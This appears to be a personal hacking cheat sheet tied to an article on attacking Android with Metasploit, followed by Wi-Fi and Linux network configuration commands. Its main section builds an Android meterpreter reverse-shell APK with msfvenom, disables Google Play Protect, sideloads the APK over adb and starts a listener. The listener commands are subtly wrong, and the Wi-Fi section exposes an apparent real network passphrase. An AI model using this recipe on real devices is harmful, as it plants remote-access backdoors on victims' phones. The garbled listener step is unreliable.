https://medium.com/nybles/exploring-android-hacking-with-metasploit-framework-2306c3511698

## Network Analysis  
nmap -sn 192.168.1.*  
nmap {ips} -A -oX hosts.xml  
searchsploit --nmap hosts.xml --json 2>&1 | tee result.json  
   
## MSF EZ Cheatsheet  
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
  
disable Google Protect  
adb connect 192.168.110.230  
adb push android_client.apk /storage/self/primary  
  
msfconsole  
set PAYLOAD multi/handler  
set LHOST 192.168.110.126  
set LPORT 4444  
exploit  

## Wi-Fi Cheatsheet

sudo iwlist wlan0 scan
wpa_passphrase "HP Deskjet 2060" Ocarina8080 | sudo tee AP/wifi_wpa_supplicant.conf  
sudo wpa_supplicant -B -i wlan0 -c AP/wifi_wpa_supplicant.conf  
sudo dhclient wlan0 -r  
MAC: cat /sys/class/net/wlan0/address    
  
Other:  
 - List drivers  
 ethtool -i wlan0  
  
 - List driver info  
 /sbin/modinfo rtl8187  
  
 - Enable Power Management  
 sudo modprobe -r rtl8187  
 sudo modprobe rtl8187 ps_enable=1  
  
 - Run changes on boot  
 sudo echo 'options rtl8187 ps_enable=1' >> /etc/modprobe.d/rtl8187.conf

 - General config
sudo nano /etc/network/interfaces

 - Networks Manager
systemctl status NetworkManager  
systemctl restart NetworkManager  

 - Scan WiFi APs (saved, hotspots, all)
nmcli c
nmcli d wifi list  
sudo iwlist <WifiInterface> scanning

 - Conn (Ubuntu >=16.04)
nmcli d connect <WifiInterface>  
nmcli d disconnect <WifiInterface>
nmcli c up <SavedWiFiConn>  
nmcli c down <SavedWiFiConn>  

'''  
auto lo  
iface lo inet loopback  

auto wlan0:0  
iface wlan0:0 inet static
        address 192.168.168.3
        netmask 255.255.255.0
'''  

ERROR  
nl80211: kernel reports: Match already configured  
